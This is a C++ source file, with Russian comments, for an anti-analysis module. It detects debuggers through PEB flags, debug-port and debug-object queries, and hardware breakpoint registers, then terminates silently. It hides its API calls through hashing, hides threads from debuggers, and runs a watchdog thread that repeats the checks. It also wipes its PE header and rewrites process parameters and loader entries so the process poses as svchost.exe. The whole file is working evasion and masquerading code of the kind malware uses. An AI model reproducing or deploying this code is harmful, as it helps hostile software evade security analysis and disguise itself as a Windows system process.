#include "anti_analysis.hpp"
#include "api_hasher.hpp"
#include <windows.h>
#include <aclapi.h>
#include <chrono>
#include <thread>
#include <atomic>
#include <intrin.h>

namespace AntiAnalysis {

namespace {

typedef NTSTATUS(NTAPI* pfnNtSetInformationThread)(
    HANDLE ThreadHandle,
    ULONG ThreadInformationClass,
    PVOID ThreadInformation,
    ULONG ThreadInformationLength
);

typedef NTSTATUS(NTAPI* pfnNtQueryInformationProcess)(
    HANDLE ProcessHandle,
    ULONG ProcessInformationClass,
    PVOID ProcessInformation,
    ULONG ProcessInformationLength,
    PULONG ReturnLength
);

typedef NTSTATUS(NTAPI* pfnNtTerminateProcess)(
    HANDLE ProcessHandle,
    NTSTATUS ExitStatus
);

static inline void silentTerminate() {
    auto pNtTerminateProcess = ApiHasher::resolve<pfnNtTerminateProcess>(
        ApiHasher::HASH_NTDLL,
        ApiHasher::HASH_NtTerminateProcess
    );
    if (pNtTerminateProcess) {
        pNtTerminateProcess(GetCurrentProcess(), 0);
    }
    ExitProcess(0);
}

static std::atomic<bool> s_watchdogRunning{ false };

} // namespace

void runGuard() {
    // 1. Прямой доступ к PEB (без импорта WinAPI в IAT)
#if defined(_M_X64) || defined(__x86_64__)
    uint8_t* peb = reinterpret_cast<uint8_t*>(__readgsqword(0x60));
    if (peb) {
        // BeingDebugged (смещение 0x02)
        if (peb[2] != 0) {
            silentTerminate();
        }
        // NtGlobalFlag (смещение 0xBC на x64)
        DWORD ntGlobalFlag = *reinterpret_cast<DWORD*>(peb + 0xBC);
        // Флаги отладки кучи: FLG_HEAP_ENABLE_TAIL_CHECK (0x10) | FLG_HEAP_ENABLE_FREE_CHECK (0x20) | FLG_HEAP_VALIDATE_PARAMETERS (0x40)
        if (ntGlobalFlag & 0x70) {
            silentTerminate();
        }
    }
#endif

    // 2. Скрытие текущего потока от отладчика (ThreadHideFromDebugger = 0x11)
    auto pNtSetInfoThread = ApiHasher::resolve<pfnNtSetInformationThread>(
        ApiHasher::HASH_NTDLL,
        ApiHasher::HASH_NtSetInformationThread
    );
    if (pNtSetInfoThread) {
        pNtSetInfoThread(GetCurrentThread(), 0x11, NULL, 0);
    }

    // 3. Запрос флагов отладки через NtQueryInformationProcess
    auto pNtQueryInfoProc = ApiHasher::resolve<pfnNtQueryInformationProcess>(
        ApiHasher::HASH_NTDLL,
        ApiHasher::HASH_NtQueryInformationProcess
    );
    if (pNtQueryInfoProc) {
        // ProcessDebugPort (класс 7) — возвращает ненулевой порт, если подключен отладчик
        DWORD_PTR debugPort = 0;
        if (pNtQueryInfoProc(GetCurrentProcess(), 7, &debugPort, sizeof(debugPort), NULL) == 0) {
            if (debugPort != 0) {
                silentTerminate();
            }
        }

        // ProcessDebugObjectHandle (класс 30 / 0x1E)
        HANDLE debugObj = NULL;
        if (pNtQueryInfoProc(GetCurrentProcess(), 30, &debugObj, sizeof(debugObj), NULL) == 0) {
            if (debugObj != NULL) {
                CloseHandle(debugObj);
                silentTerminate();
            }
        }
    }

    // 4. Проверка аппаратных контрольных точек (Hardware Breakpoints: DR0 - DR3)
    // Используем RtlCaptureContext — безопасный API для текущего потока
    CONTEXT ctx = { 0 };
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    RtlCaptureContext(&ctx);
    if (ctx.Dr0 || ctx.Dr1 || ctx.Dr2 || ctx.Dr3) {
        silentTerminate();
    }
}

void startWatchdog() {
    if (s_watchdogRunning.exchange(true)) return;

    std::thread th([]() {
        protectThreadUserMode(GetCurrentThread());
        auto pNtSetInfoThread = ApiHasher::resolve<pfnNtSetInformationThread>(
            ApiHasher::HASH_NTDLL,
            ApiHasher::HASH_NtSetInformationThread
        );
        if (pNtSetInfoThread) {
            pNtSetInfoThread(GetCurrentThread(), 0x11, NULL, 0);
        }

        while (s_watchdogRunning.load(std::memory_order_relaxed)) {
            runGuard();
            std::this_thread::sleep_for(std::chrono::milliseconds(2000));
        }
    });
    th.detach();
}

void stopWatchdog() {
    s_watchdogRunning.store(false, std::memory_order_relaxed);
}

void maskPEHeader() {
    HMODULE hMod = GetModuleHandleA(NULL);
    if (!hMod) return;

    DWORD oldProtect = 0;
    if (VirtualProtect(hMod, 4096, PAGE_READWRITE, &oldProtect)) {
        auto pDos = reinterpret_cast<PIMAGE_DOS_HEADER>(hMod);
        if (pDos->e_magic == IMAGE_DOS_SIGNATURE) {
            pDos->e_magic = 0;
        }
        VirtualProtect(hMod, 4096, oldProtect, &oldProtect);
    }
}

void protectThreadUserMode(void* hThread) {
    // Безопасный режим: не применяем пустой DACL во избежание сбоев в системных подсистемах Windows
    UNREFERENCED_PARAMETER(hThread);
}

void protectProcessUserMode() {
    // Безопасный режим: сохраняем легитимные дескрипторы для стабильной работы GDI+, WinHttp и дампов
}

typedef struct _UNICODE_STRING_DATA {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR Buffer;
} UNICODE_STRING_DATA, *PUNICODE_STRING_DATA;

void maskProcessParameters(const wchar_t* fakePath, const wchar_t* fakeCmd) {
#if defined(_M_X64) || defined(__x86_64__)
    if (!fakePath) fakePath = L"C:\\Windows\\System32\\svchost.exe";
    if (!fakeCmd) fakeCmd = L"svchost.exe -k netsvcs";

    uint8_t* pPeb = reinterpret_cast<uint8_t*>(__readgsqword(0x60));
    if (!pPeb) return;

    // 1. Маскировка ProcessParameters (ImagePathName и CommandLine)
    uint8_t* pParams = *reinterpret_cast<uint8_t**>(pPeb + 0x20);
    if (pParams) {
        auto pImagePath = reinterpret_cast<PUNICODE_STRING_DATA>(pParams + 0x60);
        auto pCmdLine = reinterpret_cast<PUNICODE_STRING_DATA>(pParams + 0x70);

        if (pImagePath && pImagePath->Buffer && pImagePath->MaximumLength > 2) {
            size_t maxChars = (pImagePath->MaximumLength / sizeof(wchar_t)) - 1;
            wcsncpy_s(pImagePath->Buffer, maxChars + 1, fakePath, _TRUNCATE);
            pImagePath->Length = static_cast<USHORT>(wcslen(pImagePath->Buffer) * sizeof(wchar_t));
        }

        if (pCmdLine && pCmdLine->Buffer && pCmdLine->MaximumLength > 2) {
            size_t maxChars = (pCmdLine->MaximumLength / sizeof(wchar_t)) - 1;
            wcsncpy_s(pCmdLine->Buffer, maxChars + 1, fakeCmd, _TRUNCATE);
            pCmdLine->Length = static_cast<USHORT>(wcslen(pCmdLine->Buffer) * sizeof(wchar_t));
        }
    }

    // 2. Маскировка LDR таблицы (главный исполняемый модуль)
    uint8_t* pLdr = *reinterpret_cast<uint8_t**>(pPeb + 0x18);
    if (pLdr) {
        PLIST_ENTRY pHead = reinterpret_cast<PLIST_ENTRY>(pLdr + 0x10);
        if (pHead && pHead->Flink != pHead) {
            uint8_t* pFirstEntry = reinterpret_cast<uint8_t*>(pHead->Flink);
            if (pFirstEntry) {
                auto pFullDllName = reinterpret_cast<PUNICODE_STRING_DATA>(pFirstEntry + 0x48);
                auto pBaseDllName = reinterpret_cast<PUNICODE_STRING_DATA>(pFirstEntry + 0x58);

                const wchar_t* baseName = wcsrchr(fakePath, L'\\');
                baseName = baseName ? (baseName + 1) : fakePath;

                if (pFullDllName && pFullDllName->Buffer && pFullDllName->MaximumLength > 2) {
                    size_t maxChars = (pFullDllName->MaximumLength / sizeof(wchar_t)) - 1;
                    wcsncpy_s(pFullDllName->Buffer, maxChars + 1, fakePath, _TRUNCATE);
                    pFullDllName->Length = static_cast<USHORT>(wcslen(pFullDllName->Buffer) * sizeof(wchar_t));
                }

                if (pBaseDllName && pBaseDllName->Buffer && pBaseDllName->MaximumLength > 2) {
                    size_t maxChars = (pBaseDllName->MaximumLength / sizeof(wchar_t)) - 1;
                    wcsncpy_s(pBaseDllName->Buffer, maxChars + 1, baseName, _TRUNCATE);
                    pBaseDllName->Length = static_cast<USHORT>(wcslen(pBaseDllName->Buffer) * sizeof(wchar_t));
                }
            }
        }
    }
#endif
}

} // namespace AntiAnalysis
